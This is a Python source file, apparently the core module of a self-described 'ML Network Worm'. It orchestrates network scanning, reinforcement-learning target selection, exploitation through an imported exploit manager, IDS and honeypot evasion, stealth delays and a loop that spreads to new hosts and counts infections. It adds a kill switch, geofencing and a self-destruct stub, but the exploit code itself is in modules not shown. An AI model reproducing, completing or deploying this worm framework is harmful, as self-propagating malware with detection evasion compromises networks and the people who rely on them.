"""
ML Network Worm - Main Core
Orchestrates all components for intelligent network propagation
"""

import time
import sys
import os
from typing import List, Dict, Optional
from datetime import datetime, timedelta

# Add parent directory to path
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from config import Config
from utils.logger import logger
from utils.network_utils import get_local_ip, is_ip_in_range
from scanner.intelligent_scanner import IntelligentScanner
from rl_engine.propagation_agent import PropagationAgent, RealWorldPropagationAgent


class WormCore:
    """
    Main worm orchestrator
    Coordinates scanning, exploitation, and propagation
    """
    
    def __init__(self, config_file: str = None):
        """Initialize worm with configuration"""
        # Load configuration
        self.config = Config(config_file) if config_file else Config()
        
        # Validate configuration
        if not self.config.validate():
            logger.critical("Invalid configuration")
            sys.exit(1)
        
        logger.info("="*60)
        logger.info("ML NETWORK WORM INITIALIZED")
        logger.info("="*60)
        logger.info(f"Local IP: {get_local_ip()}")
        logger.info(f"Target Ranges: {self.config.network.target_ranges}")
        logger.info(f"Stealth Mode: {self.config.evasion.stealth_mode}")
        logger.info(f"ML Enabled: {self.config.ml.use_pretrained}")
        logger.info("="*60)
        
        # Initialize components
        self.scanner = IntelligentScanner(self.config, use_ml=True)
        
        # Initialize exploit manager
        from exploits.exploit_manager import ExploitManager
        self.exploit_manager = ExploitManager(self.config)
        
        # Initialize evasion modules
        from evasion.ids_detector import IDSDetector
        from evasion.stealth_engine import StealthEngine
        self.ids_detector = IDSDetector(self.config)
        self.stealth_engine = StealthEngine(self.config)
        
        # Initialize RL agent
        state_size = 60  # Adjust based on expected network size
        action_size = 20
        self.rl_agent = PropagationAgent(state_size, action_size, use_dqn=True)
        
        # Load pretrained model if available
        if self.config.ml.use_pretrained and os.path.exists(self.config.ml.rl_agent_path):
            self.rl_agent.load(self.config.ml.rl_agent_path)
        
        self.real_world_agent = RealWorldPropagationAgent(self.rl_agent, action_size)
        
        # State tracking
        self.infected_hosts = set()
        self.failed_targets = set()
        self.scan_results = []
        self.start_time = None
        self.kill_switch_activated = False
        
        # Statistics
        self.stats = {
            'scans': 0,
            'infections': 0,
            'failed_exploits': 0,
            'total_hosts_discovered': 0,
            'start_time': None,
            'end_time': None
        }
    
    def check_safety_constraints(self) -> bool:
        """Check if safety constraints are violated"""
        # Check kill switch
        if self.kill_switch_activated:
            logger.log_kill_switch("Manual activation")
            return False
        
        # Check max infections
        if len(self.infected_hosts) >= self.config.propagation.max_infections:
            logger.warning(f"Max infections reached: {self.config.propagation.max_infections}")
            return False
        
        # Check runtime limit
        if self.start_time and self.config.safety.max_runtime_hours > 0:
            elapsed = datetime.now() - self.start_time
            max_runtime = timedelta(hours=self.config.safety.max_runtime_hours)
            if elapsed > max_runtime:
                logger.warning(f"Max runtime exceeded: {self.config.safety.max_runtime_hours}h")
                return False
        
        # Check auto-destruct timer
        if self.start_time and self.config.safety.auto_destruct_time > 0:
            elapsed = datetime.now() - self.start_time
            destruct_time = timedelta(hours=self.config.safety.auto_destruct_time)
            if elapsed > destruct_time:
                logger.critical(f"Auto-destruct timer reached: {self.config.safety.auto_destruct_time}h")
                self.self_destruct()
                return False
        
        # Check geofencing
        if self.config.safety.geofence_enabled:
            local_ip = get_local_ip()
            in_allowed_network = False
            for allowed_net in self.config.safety.allowed_networks:
                if is_ip_in_range(local_ip, allowed_net):
                    in_allowed_network = True
                    break
            
            if not in_allowed_network:
                logger.critical(f"Geofence violation: {local_ip} not in allowed networks")
                return False
        
        return True
    
    def activate_kill_switch(self, code: str):
        """Activate kill switch with code"""
        if code == self.config.safety.kill_switch_code:
            logger.log_kill_switch("Correct code provided")
            self.kill_switch_activated = True
            self.shutdown()
        else:
            logger.warning("Invalid kill switch code")
    
    def scan_network(self) -> List[Dict]:
        """Perform network reconnaissance"""
        logger.info("Starting network reconnaissance")
        
        self.stats['scans'] += 1
        
        # Scan target ranges
        results = self.scanner.scan_network(self.config.network.target_ranges)
        
        self.scan_results = results
        self.stats['total_hosts_discovered'] = len(results)
        
        logger.success(f"Discovered {len(results)} hosts")
        
        # Update RL agent with scan results
        self.real_world_agent.update_state(results, self.infected_hosts)
        
        return results
    
    def select_next_target(self) -> Optional[Dict]:
        """Use RL agent to select next target"""
        logger.info("Selecting next target with ML")
        
        # Update agent state
        self.real_world_agent.update_state(self.scan_results, self.infected_hosts)
        
        # Agent selects target
        target = self.real_world_agent.select_next_target()
        
        if target:
            logger.log_ml_decision(
                "RL_Agent",
                f"Target: {target['ip']}",
                target.get('confidence', 0.5),
                {
                    'ip': target['ip'],
                    'priority': target.get('priority', 0),
                    'vuln_score': target.get('vulnerability_score', 0)
                }
            )
        
        return target
    
    def exploit_target(self, target: Dict) -> bool:
        """
        Attempt to exploit target using exploit manager
        """
        ip = target['ip']
        logger.info(f"Attempting to exploit {ip}")
        
        # Check if already infected or failed
        if ip in self.infected_hosts:
            logger.warning(f"{ip} already infected")
            return False
        
        if ip in self.failed_targets:
            logger.warning(f"{ip} previously failed")
            return False
        
        # Check for IDS/Honeypot
        if self.config.evasion.detect_ids:
            if self.ids_detector.should_avoid_target(ip, target):
                logger.warning(f"Avoiding {ip} - detected as IDS/honeypot")
                self.failed_targets.add(ip)
                return False
        
        # Apply stealth delay
        if self.config.evasion.stealth_mode:
            delay = self.stealth_engine.get_scan_delay(ip)
            logger.debug(f"Applying stealth delay: {delay:.2f}s")
            time.sleep(delay)
        
        # Use exploit manager
        success, result = self.exploit_manager.exploit_target(target)
        
        if success:
            logger.log_infection(ip, result.get('method', 'Unknown'), {
                'os': target.get('os_guess', 'Unknown'),
                'ports': target.get('open_ports', []),
                'exploit_result': result
            })
            
            self.infected_hosts.add(ip)
            self.stats['infections'] += 1
            
            # Record action for stealth engine
            self.stealth_engine.record_action(ip, 'exploit_success')
            
            # Provide feedback to RL agent
            reward = 10 + target.get('vulnerability_score', 0) / 5
            self.real_world_agent.provide_feedback(target, True, reward)
            
            return True
        else:
            self.failed_targets.add(ip)
            self.stats['failed_exploits'] += 1
            
            # Record failure
            self.stealth_engine.record_action(ip, 'exploit_failed')
            
            # Negative feedback
            self.real_world_agent.provide_feedback(target, False, -5)
            
            return False
    
    def propagate(self):
        """Main propagation loop"""
        logger.info("Starting propagation")
        self.start_time = datetime.now()
        self.stats['start_time'] = self.start_time
        
        # Add local host as initially infected
        local_ip = get_local_ip()
        self.infected_hosts.add(local_ip)
        
        iteration = 0
        
        while self.check_safety_constraints():
            iteration += 1
            logger.info(f"\n{'='*60}")
            logger.info(f"PROPAGATION ITERATION {iteration}")
            logger.info(f"{'='*60}")
            
            # Scan network
            if iteration == 1 or iteration % 5 == 0:  # Rescan every 5 iterations
                self.scan_network()
            
            # Select next target
            target = self.select_next_target()
            
            if not target:
                logger.warning("No more targets available")
                break
            
            # Exploit target
            success = self.exploit_target(target)
            
            # Propagation delay
            if self.config.propagation.propagation_delay > 0:
                time.sleep(self.config.propagation.propagation_delay)
            
            # Check if we've infected enough hosts
            if len(self.infected_hosts) >= self.config.propagation.max_infections:
                logger.success(f"Max infections reached: {len(self.infected_hosts)}")
                break
            
            # Print status
            self.print_status()
        
        self.stats['end_time'] = datetime.now()
        logger.success("Propagation complete")
        self.print_final_report()
    
    def print_status(self):
        """Print current status"""
        print(f"\n{'-'*60}")
        print(f"Status Update:")
        print(f"  Infected Hosts: {len(self.infected_hosts)}")
        print(f"  Failed Targets: {len(self.failed_targets)}")
        print(f"  Total Discovered: {self.stats['total_hosts_discovered']}")
        print(f"  Success Rate: {self.stats['infections']}/{self.stats['infections'] + self.stats['failed_exploits']}")
        if self.start_time:
            elapsed = datetime.now() - self.start_time
            print(f"  Runtime: {elapsed}")
        print(f"{'-'*60}\n")
    
    def print_final_report(self):
        """Print final statistics report"""
        print(f"\n{'='*60}")
        print("FINAL REPORT")
        print(f"{'='*60}")
        print(f"Start Time: {self.stats['start_time']}")
        print(f"End Time: {self.stats['end_time']}")
        
        if self.stats['start_time'] and self.stats['end_time']:
            duration = self.stats['end_time'] - self.stats['start_time']
            print(f"Duration: {duration}")
        
        print(f"\nInfections: {self.stats['infections']}")
        print(f"Failed Exploits: {self.stats['failed_exploits']}")
        print(f"Total Scans: {self.stats['scans']}")
        print(f"Hosts Discovered: {self.stats['total_hosts_discovered']}")
        
        if self.stats['infections'] + self.stats['failed_exploits'] > 0:
            success_rate = self.stats['infections'] / (self.stats['infections'] + self.stats['failed_exploits']) * 100
            print(f"Success Rate: {success_rate:.1f}%")
        
        print(f"\nInfected Hosts:")
        for ip in self.infected_hosts:
            print(f"  - {ip}")
        
        print(f"{'='*60}\n")
        
        # Export logs
        logger.export_logs("final_report.json")
    
    def self_destruct(self):
        """Self-destruct mechanism"""
        logger.critical("SELF-DESTRUCT ACTIVATED")
        
        # Clean up traces
        logger.info("Cleaning up...")
        
        # In real implementation:
        # - Remove persistence mechanisms
        # - Delete worm files
        # - Clear logs (if configured)
        # - Restore system state
        
        logger.info("Self-destruct complete")
        self.shutdown()
    
    def shutdown(self):
        """Graceful shutdown"""
        logger.info("Shutting down worm")
        
        self.print_final_report()
        
        # Save RL agent if configured
        if self.config.ml.online_learning:
            self.rl_agent.save(self.config.ml.rl_agent_path)
        
        logger.info("Shutdown complete")
        sys.exit(0)


def main():
    """Main entry point"""
    import argparse
    
    parser = argparse.ArgumentParser(description="ML Network Worm")
    parser.add_argument('--config', type=str, help='Configuration file path')
    parser.add_argument('--scan-only', action='store_true', help='Only scan, do not propagate')
    parser.add_argument('--kill-switch', type=str, help='Activate kill switch with code')
    
    args = parser.parse_args()
    
    # Create worm instance
    worm = WormCore(config_file=args.config)
    
    # Check kill switch
    if args.kill_switch:
        worm.activate_kill_switch(args.kill_switch)
        return
    
    # Scan only mode
    if args.scan_only:
        logger.info("SCAN-ONLY MODE")
        results = worm.scan_network()
        worm.scanner.print_summary()
        return
    
    # Full propagation
    try:
        worm.propagate()
    except KeyboardInterrupt:
        logger.warning("\nInterrupted by user")
        worm.shutdown()
    except Exception as e:
        logger.error(f"Fatal error: {e}", {"exception": str(e)})
        worm.shutdown()


if __name__ == "__main__":
    main()
